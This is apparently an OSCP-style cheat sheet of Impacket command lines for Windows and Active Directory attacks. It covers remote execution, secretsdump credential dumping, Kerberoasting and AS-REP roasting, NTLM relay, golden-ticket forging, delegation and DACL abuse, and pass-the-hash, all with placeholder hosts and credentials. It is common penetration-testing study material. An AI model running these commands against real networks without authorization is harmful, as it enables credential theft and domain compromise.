# Impacket

```
# smbclient.py
smbclient.py user:password@10.10.10.10
smbclient.py DOMAIN/user:password@10.10.10.10
smbclient.py -hashes LMHASH:NTHASH user@10.10.10.10
smbclient.py -no-pass user@10.10.10.10

# psexec.py
psexec.py user:password@10.10.10.10
psexec.py DOMAIN/user:password@10.10.10.10
psexec.py -hashes LMHASH:NTHASH user@10.10.10.10
psexec.py -k -no-pass user@10.10.10.10

# wmiexec.py
wmiexec.py user:password@10.10.10.10
wmiexec.py DOMAIN/user:password@10.10.10.10
wmiexec.py -hashes LMHASH:NTHASH user@10.10.10.10
wmiexec.py -k -no-pass user@10.10.10.10

# atexec.py
atexec.py user:password@10.10.10.10
atexec.py DOMAIN/user:password@10.10.10.10
atexec.py -hashes LMHASH:NTHASH user@10.10.10.10

# dcomexec.py
dcomexec.py user:password@10.10.10.10
dcomexec.py DOMAIN/user:password@10.10.10.10
dcomexec.py -hashes LMHASH:NTHASH user@10.10.10.10

# secretsdump.py
secretsdump.py user:password@10.10.10.10
secretsdump.py DOMAIN/user:password@10.10.10.10
secretsdump.py -hashes LMHASH:NTHASH user@10.10.10.10
secretsdump.py -just-dc DOMAIN/user:password@10.10.10.10
secretsdump.py -just-dc-user administrator DOMAIN/user:password@10.10.10.10
secretsdump.py -just-dc-ntlm DOMAIN/user:password@10.10.10.10

# GetNPUsers.py (ASREP Roasting)
GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.10 -usersfile users.txt
GetNPUsers.py DOMAIN/user:password -dc-ip 10.10.10.10 -request
GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat

# GetUserSPNs.py (Kerberoasting)
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request-user svc-account
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -outputfile hashes.txt

# lookupsid.py
lookupsid.py anonymous@10.10.10.10
lookupsid.py DOMAIN/user:password@10.10.10.10
lookupsid.py -hashes LMHASH:NTHASH user@10.10.10.10

# samrdump.py
samrdump.py 10.10.10.10
samrdump.py DOMAIN/user:password@10.10.10.10

# rpcdump.py
rpcdump.py 10.10.10.10
rpcdump.py DOMAIN/user:password@10.10.10.10

# smbserver.py
smbserver.py share .
smbserver.py share /tmp/share -smb2support
smbserver.py share . -username user -password password

# ntlmrelayx.py
ntlmrelayx.py -tf targets.txt
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -c whoami

# ticketer.py
ticketer.py -nthash NTHASH -domain-sid SID -domain DOMAIN administrator
ticketer.py -aesKey AESKEY -domain-sid SID -domain DOMAIN administrator

# getTGT.py
getTGT.py DOMAIN/user:password
getTGT.py DOMAIN/user -hashes LMHASH:NTHASH

# getST.py
getST.py DOMAIN/user:password -spn cifs/server.domain.local
getST.py DOMAIN/user -hashes LMHASH:NTHASH -spn cifs/server.domain.local

# findDelegation.py
findDelegation.py DOMAIN/user:password
findDelegation.py DOMAIN/user -hashes LMHASH:NTHASH

# rbcd.py
rbcd.py -delegate-from COMPUTER1$ -delegate-to COMPUTER2$ -dc-ip 10.10.10.10 DOMAIN/user:password

# owneredit.py
owneredit.py -action write -new-owner user -target target DOMAIN/user:password

# dacledit.py
dacledit.py -action write -rights FullControl -principal user -target target DOMAIN/user:password

# addcomputer.py
addcomputer.py -computer-name TESTPC$ -computer-pass Password123 DOMAIN/user:password
addcomputer.py -method LDAPS -computer-name TESTPC$ -computer-pass Password123 DOMAIN/user:password

# changepasswd.py
changepasswd.py DOMAIN/user:oldpassword@10.10.10.10 -newpass NewPassword123

# describeTicket.py
describeTicket.py ticket.ccache

# klist.py
klist.py

# machine_role.py
machine_role.py DOMAIN/user:password@10.10.10.10

# netview.py
netview.py DOMAIN/user:password

# ping.py
ping.py 10.10.10.10

# mssqlclient.py
mssqlclient.py user:password@10.10.10.10
mssqlclient.py DOMAIN/user:password@10.10.10.10 -windows-auth
mssqlclient.py -hashes LMHASH:NTHASH user@10.10.10.10

# mssqlinstance.py
mssqlinstance.py 10.10.10.10

# reg.py
reg.py DOMAIN/user:password@10.10.10.10 query -keyName HKLM\\SOFTWARE\\Microsoft

# services.py
services.py DOMAIN/user:password@10.10.10.10 list
services.py DOMAIN/user:password@10.10.10.10 start ServiceName
services.py DOMAIN/user:password@10.10.10.10 stop ServiceName

# rdp_check.py
rdp_check.py 10.10.10.10

# sniffer.py
sniffer.py -i eth0

# Common Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH administrator@10.10.10.10
wmiexec.py -hashes LMHASH:NTHASH administrator@10.10.10.10
atexec.py -hashes LMHASH:NTHASH administrator@10.10.10.10

# Common OSCP Commands
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request
GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.10 -usersfile users.txt
secretsdump.py user:password@10.10.10.10
wmiexec.py user:password@10.10.10.10
psexec.py user:password@10.10.10.10
smbclient.py user:password@10.10.10.10
lookupsid.py anonymous@10.10.10.10
mssqlclient.py user:password@10.10.10.10 -windows-auth
ntlmrelayx.py -tf targets.txt -smb2support
smbserver.py share . -smb2support
```
